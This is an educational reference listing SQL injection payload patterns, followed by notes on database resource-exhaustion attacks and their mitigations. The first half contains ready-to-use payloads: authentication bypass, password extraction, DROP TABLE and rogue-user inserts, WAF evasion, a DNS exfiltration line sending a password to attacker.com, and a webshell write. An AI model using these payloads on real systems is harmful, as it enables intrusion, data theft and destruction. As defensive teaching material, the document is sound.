# **Common SQL injection patterns**

### **1. Authentication Bypass**
Used to log in without valid credentials.

- `' OR '1'='1' --`
- `" OR "1"="1" --`
- `' OR 1=1 --`
- `admin'--`
- `' UNION SELECT NULL,NULL--`

> **Goal**: Make the `WHERE` clause always true, tricking the app into authenticating the attacker.

### **2. Union-Based Injection**
Used to **extract data from other tables** by appending results via `UNION`.

- `' UNION SELECT username,password FROM users--`
- `' UNION SELECT 1,table_name FROM information_schema.tables--`
- `' UNION SELECT 1,2,3,4,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--`

> **Requirements**: Same number and compatible types of columns as original query.

### **3. Boolean-Based (Blind) SQL Injection**
Used when no direct output is shown; attacker infers data based on true/false responses.

- `' AND 1=1--` → page behaves normally  
- `' AND 1=2--` → page errors or changes  
- `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--`

> **Goal**: Extract data one bit/character at a time by observing app behavior.

### **4. Time-Based (Blind) SQL Injection**
Used when even boolean responses aren’t visible; relies on **delays** to infer truth.

- `' AND IF(1=1, SLEEP(5), 0)--` → delays 5 seconds  
- `' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') THEN SLEEP(3) ELSE 0 END)--`

> **Common in**: MySQL (`SLEEP()`), PostgreSQL (`pg_sleep()`), SQL Server (`WAITFOR DELAY`).

### **5. Command Execution / Data Manipulation**
Used to **modify or destroy data** (if stacked queries are allowed).

- `'; DROP TABLE users--`
- `'; INSERT INTO users (username,password) VALUES ('hacker','pwned')--`
- `'; UPDATE users SET admin=1 WHERE username='attacker'--`

> **Note**: Only works if the database driver allows **multiple statements** (e.g., MySQL with `mysqli_multi_query`, but **not** with PDO or most ORMs by default).

### **6. Out-of-Band (OOB) Exfiltration**
Used when direct or blind methods fail; data is sent to an external server.

- `' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--` (MySQL + DNS)
- `' UNION SELECT "test" INTO OUTFILE '/var/www/html/payload.php'--` (write webshell)
- `' AND EXTRACTVALUE(1, CONCAT(0x3a,(SELECT password FROM users LIMIT 1)))--` (XML error-based exfil)

> **Common in**: Environments with lax network controls.

### **7. Error-Based SQL Injection**
Forces the database to **reveal data in error messages**.

- `' AND GTID_SUBSET((SELECT password FROM users LIMIT 1),1)--` (MySQL)
- `' OR 1=CONVERT(int, (SELECT TOP 1 password FROM users))--` (SQL Server)
- `' AND 1=CAST((SELECT version()) AS int)--`

> **Relies on**: Verbose error reporting enabled in the app.

### **8. Bypassing Filters / WAF Evasion**
Used to **evade weak input filters or Web Application Firewalls**.

- **Encoding**:
  - URL-encoded: `%27%20OR%20%271%27%3D%271`
  - Hex: `0x27204f5220313d31`
- **Case variation**: `' Or '1'='1'--`
- **Inline comments**: `'/**/OR/**/'1'='1'--`
- **Null byte**: `' UNION SELECT\x00`
- **Alternative syntax**: `' || '1'='1` (in SQLite/PostgreSQL)

### **9. NoSQL Injection (Bonus)**
Not SQL, but conceptually similar—targets MongoDB, etc.

- `{"$ne": ""}` → matches all non-empty passwords  
- `{"$gt": ""}` → greater-than empty string → bypass auth  
- `{"$where": "this.password.length > 0"}` → JavaScript eval in MongoDB

### **Key Takeaway**
All these patterns **exploit the same root cause**:  
> **User input is concatenated directly into a SQL query string without parameterization or proper escaping.**

**Defense**: Always use **parameterized queries (prepared statements)**, **input validation**, **least-privilege DB accounts**, and **security testing**.

---
---

# **SQL overflow**


### 1. **SQL Injection via Large/Complex Queries (Query Bomb)**
- **Mechanism**: An attacker crafts an extremely **complex or recursive SQL query** (e.g., deeply nested `UNION`s, Cartesian products, or recursive CTEs).
- **Impact**: 
  - **CPU/memory exhaustion** on the DB server → **Denial of Service**.
  - **Query timeout bypasses** if limits aren't enforced.
- **Example**:
  ```sql
  SELECT * FROM users a, users b, users c, users d WHERE a.id = b.id; -- Massive Cartesian product
  ```
- **Prevention**:
  - Enforce **query time/resource limits** (e.g., PostgreSQL `statement_timeout`, MySQL `max_execution_time`).
  - Use **parameterized queries** (won’t stop DoS but prevents injection-based bombs).
  - Apply **application-level rate limiting**.


### 2. **Integer/Sequence Overflow**
- **Mechanism**: Applications use **auto-incrementing IDs** (e.g., 32-bit `INT`), and an attacker **forces rapid insertions** until the counter overflows.
- **Impact**:
  - Insertion failures (`duplicate key` after wraparound).
  - Application logic errors (e.g., negative IDs).
  - In rare cases, **bypass access controls** if logic assumes IDs are always positive or increasing.
- **Prevention**:
  - Use **64-bit integers** (`BIGINT`) for primary keys.
  - Monitor for abnormal insertion rates.


### 3. **Storage Exhaustion (Disk Full Attack)**
- **Mechanism**: Upload or insert **large volumes of data** (e.g., via file uploads stored in DB as BLOBs, or spamming log tables).
- **Impact**:
  - **Database crashes** when disk is full.
  - **Entire system instability** (logs, temp files, OS may fail).
- **Example**: Repeatedly uploading large files that are stored in a `BYTEA` or `BLOB` column.
- **Prevention**:
  - Enforce **user quotas** (per-user or per-tenant storage limits).
  - **Separate DB volumes** for user data vs system.
  - **Automated monitoring** of disk usage.


### 4. **Log/History Table Overflow**
- **Mechanism**: Abuse features that **log every action** (e.g., audit trails, session logs).
- **Impact**: 
  - Log tables grow uncontrollably → performance degradation or outage.
  - Attacker **floods logs** to **hide malicious activity** (log flooding).
- **Prevention**:
  - **Automatic log rotation and retention policies**.
  - **Asynchronous logging** to decouple from main app flow.
  - **Rate-limiting sensitive actions** (logins, updates).


### 5. **Buffer Overflow in Database Software (Rare but Critical)**
- **Mechanism**: Exploit **memory corruption bugs** in the **database engine itself** (e.g., via malformed packets, exotic SQL syntax, or protocol-level messages).
- **Impact**: 
  - **Remote code execution** on the DB server.
  - **Privilege escalation** (e.g., gaining `root` or `postgres` access).
- **Historical Examples**:
  - CVE-2018-10933 (**libssh** auth bypass — not SQL, but illustrates protocol-level flaws).
  - Older versions of **MySQL**, **PostgreSQL**, or **Oracle** have had buffer overflow bugs in query parsers or network handlers.
- **Prevention**:
  - **Keep DBMS updated**.
  - **Network segmentation** (DB not directly internet-facing).
  - Use **minimal privilege** for DB service accounts.


### 6. **Exponential Regex or LIKE Abuse**
- **Mechanism**: Use **wildcard-heavy `LIKE` queries** or **regex patterns** that cause catastrophic backtracking.
- **Example**:
  ```sql
  SELECT * FROM users WHERE email LIKE '%@%' || email REGEXP '^(a+)+$';
  ```
- **Impact**: High CPU usage → DoS.
- **Prevention**:
  - Avoid complex regex in user-facing filters.
  - Use **full-text search** (e.g., PostgreSQL `tsvector`) instead of `LIKE '%...%'`.


### 7. **ORM-Level “N+1” or Fetch Explosion**
- **Not a direct attack**, but an **exploitable performance flaw**:
  - Attacker requests deeply nested data (e.g., GraphQL queries with high depth).
  - Application generates **thousands of queries** → DB overload.
- **Prevention**:
  - **Query depth limiting** (in GraphQL, REST+HAL, etc.).
  - **Batch loading** and **query validation**.


### Summary: 
> **Attackers can "overflow" databases in terms of:**
- **Storage capacity**
- **Compute resources (CPU/memory)**
- **Sequence counters**
- **Log volumes**
- **Protocol/parser logic (rare)**

These are often classified under:
- **Denial-of-Service (DoS)**
- **Resource exhaustion attacks**
- **Logic abuse via boundary condition exploitation**


### Best Practices to Mitigate
1. **Enforce strict input validation & rate limiting**.
2. **Use parameterized queries** (prevents injection-based bombs).
3. **Set DB resource limits** (`statement_timeout`, `work_mem`, etc.).
4. **Monitor disk and memory usage**.
5. **Apply principle of least privilege** (DB user can’t drop tables or alter schema).
6. **Keep database software patched**.
